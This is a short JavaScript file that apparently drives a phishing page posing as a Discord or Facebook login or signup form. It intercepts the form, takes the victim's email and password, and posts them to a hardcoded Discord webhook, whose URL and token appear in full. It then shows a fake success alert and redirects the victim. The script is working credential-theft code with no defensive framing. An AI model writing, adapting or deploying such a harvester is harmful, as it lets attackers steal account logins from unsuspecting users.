document.getElementById("discord-form").addEventListener("submit", function (e) {
    e.preventDefault(); // Previne o envio automático do formulário

    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    const webhookUrl = "https://discord.com/api/webhooks/1313592292459679764/Ktq5dmZpPi85-BILUoRk5a_hwKmwszRoj8mYaZKGIugoyV9ADTy5wc4dJP0M2_OVf1Gn";

    const message = {
        content: `**Novo Login:**\n**Email:** ${email}\n**Senha:** ${password}`,
    };

    fetch(webhookUrl, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify(message),
    })
        .then(() => {
            alert("Cadastro feito com sucesso!");
            // Redireciona para o site do Facebook após o envio
            window.location.href = "index.html";
        })
        .catch(() => {
            alert("Erro ao se cadastrar!");
        });
});